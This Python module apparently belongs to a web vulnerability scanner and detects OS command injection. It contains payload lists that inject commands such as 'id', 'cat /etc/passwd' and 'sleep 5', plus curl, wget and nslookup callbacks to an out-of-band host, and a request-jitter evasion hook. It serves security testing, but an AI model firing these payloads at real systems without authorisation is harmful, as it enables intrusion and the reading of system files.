"""
modules/vulns/command_injection.py — OS Command Injection

Three strategies:
  1. Direct output — inject ; id and look for uid= in response
  2. Time-based blind — inject ; sleep 5 and measure delay
  3. OOB blind — inject DNS/HTTP callback via OOB tracker

On confirmation: Playwright screenshots the command output in browser.
"""
import asyncio
import logging
import time
from urllib.parse import urlparse, parse_qs, urlencode
from core.finding import Finding
from core.http_client import make_client, PROBE_TIMEOUT
from core.evasion import maybe_jitter
import httpx

logger = logging.getLogger(__name__)

# ── Payloads ──────────────────────────────────────────────────────────────────
LINUX_CMD   = "id"
WINDOWS_CMD = "whoami"

INJECTION_PAYLOADS: list[tuple[str, str]] = [
    # Linux — direct output
    (f"; {LINUX_CMD}",                    "semicolon"),
    (f"&& {LINUX_CMD}",                   "and-and"),
    (f"| {LINUX_CMD}",                    "pipe"),
    (f"|| {LINUX_CMD}",                   "or-or"),
    (f"`{LINUX_CMD}`",                    "backtick"),
    (f"$({LINUX_CMD})",                   "dollar-paren"),
    (f"\n{LINUX_CMD}",                    "newline"),
    (f"%0a{LINUX_CMD}",                   "url-newline"),
    (f"%3B{LINUX_CMD}",                   "url-semicolon"),
    # Windows — direct output
    (f"& {WINDOWS_CMD}",                  "win-amp"),
    (f"| {WINDOWS_CMD}",                  "win-pipe"),
    (f"&& {WINDOWS_CMD}",                 "win-and"),
    # Spaces bypassed
    (f";{LINUX_CMD}",                     "no-space"),
    (f";{LINUX_CMD}#",                    "comment"),
    (f"';{LINUX_CMD};'",                  "quoted"),
    # File read as proof
    ("; cat /etc/passwd",                 "cat-passwd"),
    ("& type C:\\Windows\\win.ini",       "win-type"),
]

TIME_PAYLOADS: list[tuple[str, str, float]] = [
    ("; sleep 5",                 "Linux sleep",   5.0),
    ("& ping -n 5 127.0.0.1",    "Windows ping",  5.0),
    ("|| sleep 5",                "or sleep",      5.0),
    ("| sleep 5",                 "pipe sleep",    5.0),
    ("; timeout 5",               "timeout",       5.0),
    ("%0asleep+5",                "url sleep",     5.0),
]

# What to look for in responses
LINUX_INDICATORS   = ["uid=", "gid=", "root:", "daemon:", "/bin/bash",
                      "www-data", "apache", "nginx", "nobody"]
WINDOWS_INDICATORS = ["NT AUTHORITY", "SYSTEM", "Administrator",
                      "\\Users\\", "[boot loader]", "[fonts]"]
OUTPUT_INDICATORS  = LINUX_INDICATORS + WINDOWS_INDICATORS

SLOW_TIMEOUT = httpx.Timeout(connect=5.0, read=18.0, write=5.0, pool=5.0)

# Only test params that are plausibly injectable
INJECTABLE_PARAMS = {
    "cmd", "command", "exec", "execute", "run", "shell", "ping",
    "host", "ip", "domain", "query", "search", "q", "input",
    "file", "path", "dir", "folder", "name", "user", "to",
    "from", "subject", "data", "payload", "arg", "args",
}


class CommandInjection:
    async def run(self, ctx: dict) -> list[Finding]:
        findings: list[Finding] = []
        endpoints = ctx.get("endpoints", [])
        forms     = ctx.get("forms", [])
        limiter   = ctx["limiter"]
        oob       = ctx.get("oob")
        verifier  = ctx.get("verifier")
        sem       = asyncio.Semaphore(8)
        seen: set[str] = set()

        async def probe_ep(ep: str):
            parsed = urlparse(ep)
            if not parsed.query:
                return
            params = parse_qs(parsed.query)
            # Prioritise injectable-looking params
            injectable = [p for p in params if p.lower() in INJECTABLE_PARAMS]
            all_params = injectable + [p for p in params if p not in injectable]
            for param in all_params[:3]:
                key = f"{parsed.netloc}{parsed.path}:{param}"
                if key in seen:
                    continue
                seen.add(key)
                f = await self._probe_param(ep, param, parsed, params, limiter, sem, verifier)
                if f:
                    findings.append(f)
                    return
                # Time-based blind if no direct output
                f2 = await self._time_probe(ep, param, parsed, params, limiter, sem)
                if f2:
                    findings.append(f2)
                    return
                # OOB blind
                if oob and oob.active:
                    f3 = await self._oob_probe(ep, param, parsed, params, limiter, sem, oob)
                    if f3:
                        findings.append(f3)
                        return

        async def probe_form(form: dict):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            inputs = form.get("inputs", [])
            if not action or not inputs:
                return
            key = f"form:{action}"
            if key in seen:
                return
            seen.add(key)
            for inp in inputs[:2]:
                f = await self._probe_form_field(form, inp, limiter, sem, verifier)
                if f:
                    findings.append(f)
                    return

        await asyncio.gather(
            *[probe_ep(ep) for ep in endpoints[:150]],
            *[probe_form(f) for f in forms[:20]],
        )
        logger.info(f"CommandInjection completed — {len(findings)} finding(s)")
        return findings

    async def _probe_param(self, url, param, parsed, params, limiter, sem, verifier) -> Finding | None:
        async with sem:
            # Reflection pre-check
            sentinel = "zp4rty_cmdi_check"
            pre_p = dict(params)
            pre_p[param] = [sentinel]
            pre_url = parsed._replace(query=urlencode(pre_p, doseq=True)).geturl()
            try:
                async with limiter.acquire():
                    async with make_client(timeout=PROBE_TIMEOUT) as c:
                        pre_r = await c.get(pre_url)
                baseline_body = pre_r.text
            except Exception:
                return None

            for payload, label in INJECTION_PAYLOADS:
                p = dict(params)
                p[param] = [payload]
                probe_url = parsed._replace(query=urlencode(p, doseq=True)).geturl()
                try:
                    await maybe_jitter()
                    async with limiter.acquire():
                        async with make_client(timeout=PROBE_TIMEOUT) as c:
                            r = await c.get(probe_url)
                    body = r.text
                    matched = [ind for ind in OUTPUT_INDICATORS if ind in body and ind not in baseline_body]
                    if matched:
                        # Extract snippet of command output
                        snippet = ""
                        for ind in matched:
                            idx = body.find(ind)
                            snippet = body[max(0, idx-20):idx+100].strip()
                            break

                        finding = Finding(
                            title=f"OS Command Injection in '{param}' ({label})",
                            severity="Critical",
                            description=(
                                f"Parameter '{param}' executes OS commands. "
                                f"Payload '{payload}' returned command output: {matched[0]}"
                            ),
                            affected_url=probe_url,
                            proof=f"GET {probe_url}\nPayload: {payload}\nOutput detected: {matched}\nSnippet: {snippet[:200]}",
                            remediation="Never pass user input to shell commands. Use parameterised APIs instead.",
                            impact=5, likelihood=5, module="CommandInjection",
                            references=["https://owasp.org/www-community/attacks/Command_Injection"],
                            cvss_score=9.8, cwe="CWE-78",
                        )
                        # Playwright screenshot
                        if verifier and verifier.available:
                            try:
                                conf, shot = await verifier.verify_sqli(probe_url)
                                if conf:
                                    finding.verified   = True
                                    finding.screenshot = shot
                                    finding.title     += " [VERIFIED]"
                            except Exception:
                                pass
                        return finding
                except Exception as e:
                    logger.debug(f"CMDi probe {probe_url}: {e}")
        return None

    async def _probe_form_field(self, form, inp, limiter, sem, verifier) -> Finding | None:
        action = form.get("action", "")
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])
        async with sem:
            baseline_data = {i: "test" for i in inputs}
            try:
                async with limiter.acquire():
                    async with make_client(timeout=PROBE_TIMEOUT) as c:
                        br = await (c.post(action, data=baseline_data) if method == "POST"
                                    else c.get(action, params=baseline_data))
                baseline_body = br.text
            except Exception:
                return None

            for payload, label in INJECTION_PAYLOADS[:8]:
                data = {i: "test" for i in inputs}
                data[inp] = payload
                try:
                    await maybe_jitter()
                    async with limiter.acquire():
                        async with make_client(timeout=PROBE_TIMEOUT) as c:
                            r = await (c.post(action, data=data) if method == "POST"
                                       else c.get(action, params=data))
                    matched = [ind for ind in OUTPUT_INDICATORS
                                if ind in r.text and ind not in baseline_body]
                    if matched:
                        return Finding(
                            title=f"OS Command Injection in Form Field '{inp}'",
                            severity="Critical",
                            description=f"Form field '{inp}' at {action} executes OS commands.",
                            affected_url=action,
                            proof=f"{method} {action}\n{inp}={payload}\nOutput: {matched}",
                            remediation="Never pass user input to shell commands.",
                            impact=5, likelihood=5, module="CommandInjection",
                            cvss_score=9.8, cwe="CWE-78",
                        )
                except Exception as e:
                    logger.debug(f"CMDi form {action}: {e}")
        return None

    async def _time_probe(self, url, param, parsed, params, limiter, sem) -> Finding | None:
        async with sem:
            for payload, label, delay in TIME_PAYLOADS[:3]:
                p = dict(params)
                p[param] = [payload]
                probe_url = parsed._replace(query=urlencode(p, doseq=True)).geturl()
                try:
                    start = time.monotonic()
                    async with limiter.acquire():
                        async with make_client(timeout=SLOW_TIMEOUT) as c:
                            await c.get(probe_url)
                    elapsed = time.monotonic() - start
                    if 4.0 <= elapsed < 15.0:
                        return Finding(
                            title=f"Blind OS Command Injection (Time-Based) in '{param}'",
                            severity="Critical",
                            description=f"Parameter '{param}' caused {elapsed:.1f}s delay via '{label}'.",
                            affected_url=probe_url,
                            proof=f"GET {probe_url}\nPayload: {payload}\nDelay: {elapsed:.2f}s",
                            remediation="Never pass user input to shell commands.",
                            impact=5, likelihood=4, module="CommandInjection",
                            cvss_score=9.0, cwe="CWE-78",
                        )
                except Exception:
                    pass
        return None

    async def _oob_probe(self, url, param, parsed, params, limiter, sem, oob) -> Finding | None:
        async with sem:
            token, cb_url = oob.register(f"cmdi_{param}")
            from urllib.parse import urlparse as _up
            host = _up(cb_url).netloc or cb_url.replace("http://", "").split("/")[0]
            payloads = [
                f"; curl http://{host}/",
                f"; wget -q http://{host}/",
                f"& ping -n 1 {host}",
                f"| nslookup {host}",
            ]
            for payload in payloads:
                p = dict(params)
                p[param] = [payload]
                probe_url = parsed._replace(query=urlencode(p, doseq=True)).geturl()
                try:
                    async with limiter.acquire():
                        async with make_client(timeout=PROBE_TIMEOUT) as c:
                            await c.get(probe_url)
                except Exception:
                    pass
            if await oob.wait_for(token, timeout=6.0):
                return Finding(
                    title=f"Blind OS Command Injection via '{param}' (OOB Confirmed)",
                    severity="Critical",
                    description=f"OOB callback confirmed command injection in '{param}'.",
                    affected_url=url,
                    proof=f"GET {url}\nOOB callback received after injection",
                    remediation="Never pass user input to shell commands.",
                    impact=5, likelihood=5, module="CommandInjection",
                    cvss_score=9.8, cwe="CWE-78",
                )
        return None
